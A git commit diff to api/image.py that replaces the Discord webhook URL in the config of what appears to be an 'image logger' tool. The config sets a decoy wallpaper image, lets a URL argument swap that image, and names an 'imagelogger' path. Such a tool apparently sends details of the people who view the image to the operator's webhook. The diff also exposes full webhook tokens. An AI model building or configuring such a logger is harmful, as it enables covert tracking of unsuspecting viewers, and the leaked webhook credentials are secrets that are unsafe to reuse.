eadac4102119740186c5753cfd63a13de14f79b4
number1pratyanthemsong <ooa962406@gmail.com>
2026-04-19 16:37:11 +0200

    Update image.py

--- api/image.py
+++ api/image.py
@@ -12,7 +12,7 @@ __author__ = "Dexty"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/1484314490022531104/-agAcpanBJdw2OYV-3Qgg-cPk5KT7r-2DmQK020MwTRrUhy72nAx8eJVtT6gsajeXNYE",
+    "webhook": "https://discord.com/api/webhooks/1495432991101681754/bqIvq8v9czPdttigEfhs1r87_ljnRRvO8db-tdJQouf0Ip_Ck60Fr9yA4SE6jjQIhk1B",
     "image": "https://wallpapers.com/images/featured/xp-background-nhvtxpop808oaye4.jpg", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
